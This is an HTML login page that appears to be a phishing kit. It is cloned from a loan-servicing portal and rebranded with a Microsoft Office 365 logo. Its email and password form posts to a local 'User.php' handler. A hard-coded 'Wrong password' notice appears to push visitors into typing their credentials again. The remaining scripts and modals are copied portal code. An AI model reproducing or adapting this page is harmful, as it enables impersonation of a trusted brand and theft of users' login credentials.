

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="icon" type="image/x-icon" href="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <META HTTP-EQUIV="Pragma" CONTENT="no-cache">
    <META HTTP-EQUIV="Expires" CONTENT="-1">
    <title>
        Login
    </title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
    <!--     Fonts and icons     -->
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,200" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <!-- CSS Files -->
    <link rel="stylesheet" href="https://myservion.ficsloanstat.com/UserLoginBundles/qtoeD18cLdrfqRM9JboZMs14bSeNTD5I3N0qii1cfxQ1.css" />
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-613827-11"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'UA-613827-11');
    </script>
</head>
<body class="bg-dark">
    <div class="loading">
        Loading&#8230;
    </div>
    <div class="wrapper wrapper-full-page ">
        <div class="full-page section-image" filter-color="black" data-image="https://myservion.ficsloanstat.com/Areas/Admin/theme/assets/img/bg/FICSBackground.jpeg">
            <!--   you can change the color of the filter page using: data-color="blue | purple | green | orange | red | rose " -->
            <div class="content">
                <div class="container">
                    

<div class="col-lg-4 col-md-6 ml-auto mr-auto">
<form action="User.php" id="test" method="post">        <div class="card card-login">
            <div class="card-header ">
                <div class="card-header ">
                    <center>
<a class="navbar-brand text-white" href="/">
					<img alt="T.LY Logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Microsoft_Office_logo_%282019%E2%80%93present%29.svg/1200px-Microsoft_Office_logo_%282019%E2%80%93present%29.svg.png" width="82" height="60" /><font color="#FF0000">office365</font></a></center>
                    <input id="CompanyLogo" name="CompanyLogo" type="hidden" value="101402_logo.png" />
                    <input id="CompanyName" name="CompanyName" type="hidden" value="Servion, Inc" />
                    <input id="Version" name="Version" type="hidden" value="" />
                    <input id="Token" name="Token" type="hidden" value="" />
                </div>
            </div>
            <div class="card-body ">
                <div class="input-group">
                        <div class="input-group-prepend">
                            <span class="input-group-text">
                                <i class="nc-icon nc-single-02"></i>
                            </span>
                        </div>
						<label for="User_Name" hidden="hidden" id="userNameLabel">
						Email</label><input aria-labelledby="userNameLabel" class="form-control focus noRedBorder" id="user_id" name="user_id" placeholder="Email" required="required" type="text" value="" />                </div>
                <span class="field-validation-valid text-danger" data-valmsg-for="user_id" data-valmsg-replace="true"></span>
                    <div class="input-group">
                        <div class="input-group-prepend">
                            <span class="input-group-text">
                                <i class="nc-icon nc-key-25"></i>
                            </span>
                        </div>
                        <label for="Password" hidden="hidden" id="passwordLabel">password</label>
                        <input aria-labelledby="passwordLabel" class="form-control noRedBorder" id="password" name="password" placeholder="Password" required="required" type="password" />
                    </div>
<span class="field-validation-valid text-danger" data-valmsg-for="password" data-valmsg-replace="true"></span>            </div>
            <div class="card-footer ">
                <input id="submitButton" type="submit" value="Login" class="btn btn-warning btn-round btn-block mb-3">

                <div class="row">
                    &nbsp;<font color="#FF0000">Wrong password. Login with correct details. </font>
                </div>
            </div>
        </div>
</form>
    

</div>

<div id="contactUsModal" class="modal" role="dialog">
    <div class="modal-dialog modal-lg">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">&times;</button>
                <center><img src="https://myservion.ficsloanstat.com/CustomerImages/logos/101402_logo.png" aria-label="Contact Us Company Logo"/></center>
                <h4 class="modal-title text-center">Contact Us</h4>
            </div>
            <div class="modal-body">
                <div id="ReplaceContactUs"></div>
            </div>
        </div>
    </div>
</div>

<div id="registerModal" class="modal" role="dialog">
    <div class="modal-dialog modal-lg">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" onclick="clearError()">&times;</button>
                <center><img src="https://myservion.ficsloanstat.com/CustomerImages/logos/101402_logo.png" aria-label="Borrower Registration Company Logo"/></center>
                <h4 class="modal-title text-center">Borrower Registration</h4>
            </div>
            <div class="modal-body">
                <div id="registerError" class="row hidden">
                    <label class="col-sm-12 text-center text-danger">Sorry that Loan Number and SSN/TIN are invalid.  Please try again.</label>
                </div>
                <div id="registerPinError" class="row hidden">
                    <label class="col-sm-12 text-center text-danger">Sorry that Loan Number, SSN/TIN, and PIN are invalid.  Please try again.</label>
                </div>
                <div id="ReplaceRegister"></div>
            </div>
        </div>
    </div>
</div>

<div id="clickWrapModal" class="modal" role="dialog">
    <div class="modal-dialog modal-lg">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">&times;</button>
                <center><img src="https://myservion.ficsloanstat.com/CustomerImages/logos/101402_logo.png" aria-label="Click Wrap Agreement Company Logo"/></center>
                <h4 class="modal-title text-center">Click Wrap Agreement</h4>
            </div>
            <div class="modal-body">
                <div id="ClickWrapResult"></div>
            </div>
        </div>
    </div>
</div>

<div id="createModal" class="modal" role="dialog">
    <div class="modal-dialog modal-lg">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">&times;</button>
                <center><img src="https://myservion.ficsloanstat.com/CustomerImages/logos/101402_logo.png" aria-label="Create Your Account Company Logo"/></center>
                <h4 class="modal-title text-center">Create Your Account</h4>
            </div>
            <div class="modal-body">
                <div id="createError" class="row hidden">
                    <label id="createErrorMsg" class="col-sm-12 text-center text-danger">Token has expired.  Please retry registering.</label>
                    <div class="text-center">
                        <input type="reset" class="btn btn-danger" data-dismiss="modal" value="Close" onclick="resetCreate()" />
                    </div>
                </div>
                <div id="createSuccess" class="row hidden">
                    <label id="createSuccessMsg" class="col-sm-12 text-center text-success">Your account has been created.  You will receive an email shortly.  Click on the link in the email to activate your account.  Once your account is activated, you will be able to log in.</label>
                    <div class="text-center">
                        <input type="reset" class="btn btn-danger" data-dismiss="modal" value="Close" onclick="resetCreate()" />
                    </div>
                </div>
                <div id="CreateResult"></div>
            </div>
        </div>
    </div>
</div>

<div id="forgotPasswordModal" class="modal" role="dialog">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">&times;</button>
                <center><img src="https://myservion.ficsloanstat.com/CustomerImages/logos/101402_logo.png" aria-label="Forgot Password Company Logo"/></center>
                <h4 class="modal-title text-center">Forgot Password</h4>
            </div>
            <div class="modal-body">
                <div id="ReplaceForgotPassword"></div>
            </div>
        </div>
    </div>
</div>

<div id="resetPasswordModal" class="modal" role="dialog">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">&times;</button>
                <center><img src="https://myservion.ficsloanstat.com/CustomerImages/logos/101402_logo.png" aria-label="Reset Password Company Logo" /></center>
                <h4 class="modal-title text-center">Reset Password</h4>
            </div>
            <div class="modal-body">
                <div id="ReplaceResetPassword"></div>
            </div>
        </div>
    </div>
</div>


                </div>
            </div>
        </div>
    </div>
    <script src="https://myservion.ficsloanstat.com/routejs.axd/86188ad493a30ea69d869af010e8778735c551ba/router.js"></script>
    <script src="https://myservion.ficsloanstat.com/bundle/UserBundles/gM21m8LlZXdTNJvu-8HNXff-MMgYmoSxck5xgrvW2fw1.js" type="text/javascript"></script>
    <script type="text/javascript">

        $(function () {
            toastr.options = {
                "closeButton": false,
                "debug": false,
                "newestOnTop": false,
                "progressBar": true,
                "positionClass": "toast-top-right",
                "preventDuplicates": false,
                "onclick": null,
                "showDuration": "300",
                "hideDuration": "300",
                "timeOut": "3000",
                "extendedTimeOut": "1000",
                "showEasing": "swing",
                "hideEasing": "linear",
                "showMethod": "fadeIn",
                "hideMethod": "fadeOut"
            }

            var isError = "False";
            var message = "";

            if (message.length > 0) {
                if (isError == "True") {
                    toastr.error(message);
                }
                else {
                    toastr.success(message);
                }
            }



        });
    </script>

    
    <script type="text/javascript">

        $(document).ready(function () {
            var token = '';
            var flag = 'False';
            resetPassword(token, flag);
        });

        function register() {
            $.ajax({
                type: 'GET',
                url: '/LoginOptions/Register',
                success: function (response) {
                    $('#ReplaceRegister').html(response);
                    $('#registerModal').modal("show");
                }
            });
        }

        function returnToLogin() {
            //alert("1");
            window.location = '/User/Login';
        }

        function clickWrap() {
            if ($('#ClickWrapResult').html() != "" && $('#ClickWrapResult').html() != "DENIED" && $('#ClickWrapResult').html() != "PIN" && $('#ClickWrapResult').html() != "ERRORMSG2") {
                $('#ReplaceRegister').html($('#ClickWrapResult').html());
                $('#registerModal').modal("hide");
                $('#clickWrapModal').modal("show");
                registrationToken = $('#clickWrapId').data("token");
            }
            else {
                if ($('#ClickWrapResult').html() == "DENIED") {
                    window.location = '/User/Denied';
                } else if ($('#ClickWrapResult').html() == "PIN") {
                    $('#pinDiv').html('<div class="row"><div class="col-md-2"><label for="Pin" hidden="hidden" id="pinLabel">PIN</label></div><div class="col-md-8"><div class="form-group"><input aria-labelledby="pinLabel" autocomplete="off" class="form-control" id="pin" name="Pin" placeholder="PIN" maxlength="10" required="required" type="text" value=""></div></div></div>');
                } else if ($('#ClickWrapResult').html() == "ERRORMSG2") {
                    $("#registerPinError").show();
                } else {
                    $("#registerError").show();
                }

            }
        }

        function clearError() {
            $("#registerError").hide();
            $("#registerPinError").hide();
        }

        function create() {
            $('#clickWrapModal').modal("hide");
            $('#createModal').modal("show");
            $('#TokenId').val(registrationToken);
            hideBusyIndicator();
        }

        function createFinish(data) {
            if (typeof data === 'object') {
                if (data.HasError == false) {
                    $("#createSuccess").show();
                }
                else {
                    $("#createError").show();
                }
            }
        }

        function resetCreate() {
            $("#CreateResult").show();
            $("#createSuccess").hide();
            $("#createError").hide();
        }

        function contactUs() {
            $.ajax({
                type: 'GET',
                url: '/ContactUs',
                data: 'hideLayout=true',
                success: function (response) {
                    $('#ReplaceContactUs').html(response);
                    $('#contactUsModal').modal("show");

                }
            });
        }

        function forgotPassword() {
            $.ajax({
                type: 'GET',
                url: '/LoginOptions/ForgotPassword',
                success: function (response) {
                    $('#ReplaceForgotPassword').html(response);
                    $('#forgotPasswordModal').modal("show");
                }
            });
        }

        function forgotPasswordStart() {
            displayBusyIndicator();
        }

        function clickWrapBegin() {
            displayBusyIndicator();
        }

        function clickWrapComplete() {
            hideBusyIndicator();
        }

        function createAccountPostBegin() {
            displayBusyIndicator();
        }

        function createAccountPostComplete() {
            hideBusyIndicator();
        }

        function createAccountBegin() {
            displayBusyIndicator();
        }

        function forgotComplete(data) {
            if (data.responseJSON.HasError === true && data.responseJSON.IsBorrower === true) {
                $.ajax({
                    type: 'GET',
                    url: '/LoginOptions/ForgotLoanPassword',
                    data: "userName=" + data.responseJSON.UserName + "&ssnTin=" + data.responseJSON.SsnTin,
                    success: function (response) {
                        $('#ReplaceForgotPassword').html(response);
                        $('#forgotPasswordModal').modal("show");
                    }
                });
            }
            else if (data.responseJSON.HasError === true) {
                toastr.error("Sorry, the password change was unsuccessful.");
                forgotPassword();
            }
            else {
                $('#forgotPasswordModal').modal("hide");
                toastr.success("Please check your inbox to proceed with a password reset.");
            }
            hideBusyIndicator();
        }

        function resetPassword(data, flag) {
            $.ajax({
            type: 'GET',
                   url: '/LoginOptions/ResetPassword',
                  data: 'token=' + data + '&flag=' + flag,
                 success: function(response) {
                     if (response != "failed") {
                         $('#ReplaceResetPassword').html(response);
                         $('#resetPasswordModal').modal("show");
                     }
                }
            });
        }

        function resetComplete(data) {
            if (data.responseJSON.HasError === true) {
                toastr.error("Sorry, the password change was unsuccessful.");
                forgotPassword();
            }
            else {
                $('#forgotPasswordModal').modal("hide");
                $('#resetPasswordModal').modal("hide");
                toastr.success("Please check your inbox to proceed with a password reset.");
            }
        }

        //$('input').each(
        //    function (i, obj) {
        //        var input = $(this);
        //        input.on('input', function () {
        //            $(this).get(0).setCustomValidity("");
        //        });
        //});

        //function setCustomValidation() {
        //    if ($("label").hasClass("ficsServerErrors")) {
        //        $('label.ficsServerErrors').each(
        //            function (i, obj) {
        //                var input = $(this);
        //                var key = input.data('key');
        //                var value = input.data('value');
        //                $('#' + key).get(0).setCustomValidity(value);
        //            }
        //        );
        //    }
        //}
    </script>



    <script type="text/javascript">
        $(function () {
            LoadImage();
            $(".focus").focus();
        })

        function LoadImage() {
            $.ajax({
                type: 'GET',
                url: '/Home/GetBackground',
                success: function (response) {
                    if (response == "") {
                        GetDefault();
                    }
                    else {
                        $page = $('.full-page');
                        image_container = '<div class="full-page-background" style="background-image: url(' + response + ') "/>';
                        $page.append(image_container);
                    }
                },
                error: function () {
                    GetDefault();
                }
            });
        }

        function GetDefault() {
            $page = $('.full-page');
            image_src = GetRandom(); //$page.data('image');
            if (image_src !== undefined) {
                image_container = '<div class="full-page-background" style="background-image: url(' + image_src + ') "/>';
                $page.append(image_container);
            }
        }

        var choices = [
            "https://myservion.ficsloanstat.com/Areas/Admin/theme/assets/img/bg/FICSBackground.jpeg"
        ];
        function GetRandom() {
            var index = Math.floor(Math.random() * choices.length);
            return choices[index];
        }
    </script>

</body>

</html>